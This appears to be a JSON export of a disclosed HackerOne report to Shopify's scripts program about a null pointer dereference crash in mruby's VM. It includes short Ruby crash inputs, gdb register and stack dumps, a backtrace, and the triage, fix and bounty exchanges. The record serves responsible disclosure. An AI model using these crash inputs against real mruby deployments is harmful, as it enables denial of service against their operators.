{"id":210429,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTA0Mjk=","url":"https://hackerone.com/reports/210429","title":"mrb_vm_exec - null ptr dereference","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-03T17:12:14.337Z","submitted_at":"2017-03-03T17:12:14.337Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"icanthack","url":"/icanthack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/VZT6z9VkSXerNiDeTxWymrSK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-13T21:10:26.049Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-03-14T21:10:10.656Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Linux Ubuntu Xenial x64\ncommit ffdf7be7235717fb1cd30e54c24c5383f705f110\nAuthor: Yukihiro \"Matz\" Matsumoto \u003cmatz@ruby-lang.org\u003e\nDate:   Thu Mar 2 20:38:16 2017 +0900\n\nProbably related with https://github.com/mruby/mruby/issues/3389\n\nOld PoC\n```\n0.instance_eval { super() }\n```\r\n\nNew PoC \n```\np.instance_eval { super() {1} [ ++1] }\n```\r\n\noutput\n```\n [----------------------------------registers-----------------------------------]\nRAX: 0x0\nRBX: 0x6c3e50 --\u003e 0x0\nRCX: 0x6c3e70 --\u003e 0x300000001\nRDX: 0x0\nRSI: 0x1\nRDI: 0x6b1010 --\u003e 0x7fffffffde00 --\u003e 0x0\nRBP: 0x7fffffffdef0 --\u003e 0x7fffffffdf40 --\u003e 0x7fffffffdfa0 --\u003e 0x7fffffffe130 --\u003e 0x7fffffffe160 --\u003e 0x7fffffffe220 (--\u003e ...)\nRSP: 0x7fffffffd880 --\u003e 0x6b10e8 --\u003e 0x6fb310 --\u003e 0x7072e0 --\u003e 0x1\nRIP: 0x4225b0 (\u003cmrb_vm_exec+5547\u003e:\tmov    eax,DWORD PTR [rax])\nR8 : 0xd ('\\r')\nR9 : 0x6bc950 --\u003e 0x1109\nR10: 0x7ffff7ac8b88 --\u003e 0x70d6f0 --\u003e 0x0\nR11: 0x7ffff7899390 --\u003e 0xfffda380fffda0af\nR12: 0x401990 (\u003c_start\u003e:\txor    ebp,ebp)\nR13: 0x7fffffffe300 --\u003e 0x2\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x42259e \u003cmrb_vm_exec+5529\u003e:\tlea    rdx,[rax*4+0x0]\n   0x4225a6 \u003cmrb_vm_exec+5537\u003e:\tmov    rax,QWORD PTR [rbp-0x470]\n   0x4225ad \u003cmrb_vm_exec+5544\u003e:\tadd    rax,rdx\n=\u003e 0x4225b0 \u003cmrb_vm_exec+5547\u003e:\tmov    eax,DWORD PTR [rax]\n   0x4225b2 \u003cmrb_vm_exec+5549\u003e:\tmov    DWORD PTR [rbp-0x620],eax\n   0x4225b8 \u003cmrb_vm_exec+5555\u003e:\tmov    rax,QWORD PTR [rbp-0x658]\n   0x4225bf \u003cmrb_vm_exec+5562\u003e:\tmov    rax,QWORD PTR [rax+0x20]\n   0x4225c3 \u003cmrb_vm_exec+5566\u003e:\tmov    rax,QWORD PTR [rax+0x8]\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffd880 --\u003e 0x6b10e8 --\u003e 0x6fb310 --\u003e 0x7072e0 --\u003e 0x1\n0008| 0x7fffffffd888 --\u003e 0x720660 --\u003e 0x800029008000a0\n0016| 0x7fffffffd890 --\u003e 0x6b3fb0 --\u003e 0x10d\n0024| 0x7fffffffd898 --\u003e 0x6b1010 --\u003e 0x7fffffffde00 --\u003e 0x0\n0032| 0x7fffffffd8a0 --\u003e 0x7fff00ffd8d0\n0040| 0x7fffffffd8a8 --\u003e 0x6bd370 --\u003e 0x6909 ('\\ti')\n0048| 0x7fffffffd8b0 --\u003e 0xd00000002\n0056| 0x7fffffffd8b8 --\u003e 0x3008000a0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000004225b0 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3fb0, pc=0x720660) at /home/vagrant/new/mruby/src/vm.c:1153\n1153\t      mrb_sym mid = syms[GETARG_B(i)];\n```\r\n\nbt\n```\ngdb-peda$ bt\n#0  0x00000000004225b0 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3fb0, pc=0x720660) at /home/vagrant/new/mruby/src/vm.c:1153\n#1  0x0000000000421003 in mrb_vm_run (mrb=0x6b1010, proc=0x6b4040, self=..., stack_keep=0x0) at /home/vagrant/new/mruby/src/vm.c:815\n#2  0x0000000000429288 in mrb_top_run (mrb=0x6b1010, proc=0x6b4040, self=..., stack_keep=0x0) at /home/vagrant/new/mruby/src/vm.c:2568\n#3  0x00000000004496ea in mrb_load_exec (mrb=0x6b1010, p=0x70d720, c=0x70c380) at /home/vagrant/new/mruby/mrbgems/mruby-compiler/core/parse.y:5759\n#4  0x0000000000449780 in mrb_load_file_cxt (mrb=0x6b1010, f=0x70d370, c=0x70c380) at /home/vagrant/new/mruby/mrbgems/mruby-compiler/core/parse.y:5768\n#5  0x00000000004022f0 in main (argc=0x2, argv=0x7fffffffe308) at /home/vagrant/new/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n#6  0x00007ffff7725830 in __libc_start_main (main=0x401fd6 \u003cmain\u003e, argc=0x2, argv=0x7fffffffe308, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e,\n    rtld_fini=\u003coptimized out\u003e, stack_end=0x7fffffffe2f8) at ../csu/libc-start.c:291\n#7  0x00000000004019b9 in _start ()\ngdb-peda$\n```","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":165978,"file_name":"Snip20170304_34.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/165/978/cd7a603b0242f953f457e96b08df73988d43ce3c/Snip20170304_34.png?response-content-disposition=attachment%3B%20filename%3D%22Snip20170304_34.png%22%3B%20filename%2A%3DUTF-8%27%27Snip20170304_34.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140353Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cdb11c270ac35f74fa27c5cf6d4b78b717880707bca2c6a4b90b9c4e7c5b75e6","file_size":36260,"type":"image/png"}],"allow_singular_disclosure_at":"2017-04-13T21:10:10.698Z","allow_singular_disclosure_after":-141843222.79014516,"singular_disclosure_allowed":true,"vote_count":5,"voters":["ali","icanthack","eveeez","spetr0x","b69fb2ebda43240ece9dbeb"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1517833,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-03-03T17:12:14.555Z","updated_at":"2017-03-03T17:12:14.555Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1527392,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3490","automated_response":false,"created_at":"2017-03-08T16:19:14.347Z","updated_at":"2017-03-08T16:19:14.347Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1528072,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, you can also trigger the same crash using this input:\n\n```\nHash.new{0|break}[0]\n```\n\nSo, now I'm not sure if it's only related to instance_eval. (https://github.com/mruby/mruby/issues/3490)\n\n","automated_response":false,"created_at":"2017-03-08T20:50:38.894Z","updated_at":"2017-03-08T20:50:38.894Z","actor":{"username":"icanthack","cleared":true,"url":"/icanthack","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VZT6z9VkSXerNiDeTxWymrSK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1532597,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"According to the author of MRuby, the `Hash.new{0|break}[0]` crash has the same root cause as https://github.com/mruby/mruby/issues/3359 and so there's no need to open a separate report for it.","automated_response":false,"created_at":"2017-03-10T15:38:24.952Z","updated_at":"2017-03-10T15:38:24.952Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1532613,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The `instance_eval` bug was fixed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/2f299cf4dc930890faecbe5d54235996e37a4c8b\nhttps://github.com/mruby/mruby/commit/ff262f2133a5ffed2051e50a3fbcacf4c6920ecd\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-10T15:46:19.553Z","updated_at":"2017-03-10T15:46:19.553Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"icanthack","url":"/icanthack"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541577,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","automated_response":false,"created_at":"2017-03-14T21:10:04.810Z","updated_at":"2017-03-14T21:10:04.810Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"icanthack","url":"/icanthack"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541578,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-14T21:10:10.677Z","updated_at":"2017-03-14T21:10:10.677Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610572,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-13T21:10:26.064Z","updated_at":"2017-04-13T21:10:26.064Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}